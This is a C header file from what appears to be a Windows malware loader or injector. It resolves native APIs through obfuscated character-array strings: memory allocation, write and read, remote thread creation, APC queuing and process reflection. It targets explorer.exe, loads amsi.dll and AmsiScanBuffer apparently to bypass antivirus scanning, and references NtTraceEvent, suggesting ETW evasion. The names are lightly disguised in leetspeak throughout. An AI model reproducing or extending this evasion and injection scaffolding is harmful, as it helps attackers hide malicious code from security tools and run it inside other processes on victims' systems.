#pragma once

#include <Windows.h>
#include "helpers.h"
#include "PEstructs.h"

WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
char txt[] = { '.','t','e','x','t', 0 };
WCHAR procName[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };

WCHAR am51[] = { 'a','m','s','i','.','d','l','l',0 };
char am51Buff[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r',0 };

HMODULE  dllModule = hlpGetModuleHandle(masterDLL);
HMODULE  am51dll = LoadLibrary(am51);

char protect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtProtectVirtualMemory pVirtualProtect = (myNtProtectVirtualMemory)hlpGetProcAddress(dllModule, protect);

char rtl[] = { 'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','R','e','f','l','e','c','t','i','o','n',0 };
RtlCreateProcessReflectionFunc pRtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)hlpGetProcAddress(dllModule, rtl);

char write[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtWriteVirtualMemory pWriteMem = (myNtWriteVirtualMemory)hlpGetProcAddress(dllModule, write);

char qu3rySyst3m[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
myNtQuerySystemInformation penumProc = (myNtQuerySystemInformation)hlpGetProcAddress(dllModule, qu3rySyst3m);

char alloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtAllocateVirtualMemory pAllocMem = (myNtAllocateVirtualMemory)hlpGetProcAddress(dllModule, alloc);

char ntRead[] = { 'N','t','R','e','a','d','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
myNtReadVirtualMemory pReadMem = (myNtReadVirtualMemory)hlpGetProcAddress(dllModule, ntRead);

char ntTraceEvent[] = {'N','t','T','r','a','c','e','E','v','e','n','t',0};

WCHAR k3rn3l[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0 };
char qu3u3[] = { 'Q','u','e','u','e','U','s','e','r','A','P','C',0 };
myQueueUserAPC pQueueUserAPC = (myQueueUserAPC)hlpGetProcAddress(hlpGetModuleHandle(k3rn3l), qu3u3);

char Op3npr0[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s',0 };
myNtOpenProcess pOpenProcess = (myNtOpenProcess)hlpGetProcAddress(dllModule, Op3npr0);

char t3stAl3rt[] = { 'N','t','T','e','s','t','A','l','e','r','t',0 };
myNtTestAlert testAlert = (myNtTestAlert)hlpGetProcAddress(dllModule, t3stAl3rt);

char ThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
myNtCreateThreadEx pRemoteThread = (myNtCreateThreadEx)hlpGetProcAddress(dllModule, ThreadEx);

// pointer to original MessageBox
int (WINAPI* pOrigMessageBox)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) = MessageBoxA;
void (WINAPI* pOrigSleep)(DWORD dwMilliseconds) = Sleep;
HANDLE (WINAPI* pCreateRemoteThread)(HANDLE                 hProcess, 
									LPSECURITY_ATTRIBUTES  lpThreadAttributes, 
									SIZE_T                 dwStackSize, 
									LPTHREAD_START_ROUTINE lpStartAddress, 
									LPVOID                 lpParameter, 
									DWORD                  dwCreationFlags, 
									LPDWORD                lpThreadId) = CreateRemoteThread;
WCHAR us3r32[] = { 'U','S','E','R','3','2','.','D','L','L',0 };
